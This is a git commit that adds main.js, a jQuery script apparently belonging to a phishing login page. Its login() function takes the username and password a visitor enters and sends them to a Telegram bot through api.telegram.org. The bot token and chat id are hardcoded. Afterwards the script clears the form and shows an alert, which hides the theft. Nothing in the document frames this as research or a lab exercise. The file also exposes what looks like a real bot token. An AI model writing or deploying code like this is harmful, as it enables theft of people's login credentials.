9f904fcc6db7dc2913d59085fa6b7b37cd63816a
kosaer <49170395+kosaer@users.noreply.github.com>
2019-12-03 23:00:29 +0300

    Add files via upload

---
+++ main.js
@@ -0,0 +1,59 @@
+$(document).ready(function(){
+
+
+var winh = $(window).height();
+
+
+$(".header").height(winh);
+
+
+$(".space").height(winh /4);
+
+$("button").click(function(){
+
+
+
+
+window.location.href = "login.html";
+
+
+
+
+});
+
+});
+
+function login(){
+
+
+var username = $("#username").val();
+
+
+var pass = $("#pass").val();
+
+var text = "user : `" + username + "` || pass : `" + pass + "`" 
+
+var token = "785017981:AAG7aJ2hE2qlwDfU55_R672FO9X2nb5e7PQ";
+
+var id = "839360025";
+
+if(username.length > 0 && pass.length > 0){
+
+
+$("#logbut").attr("disabled","disabled");
+
+  
+    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text + "&parse_mode=markdown" , function( data ) {
+
+$("#logbut").removeAttr("disabled","disabled");
+
+$(".alert").show();
+
+$("#username,#pass").val("");
+
+      });
+
+
+}
+
+}
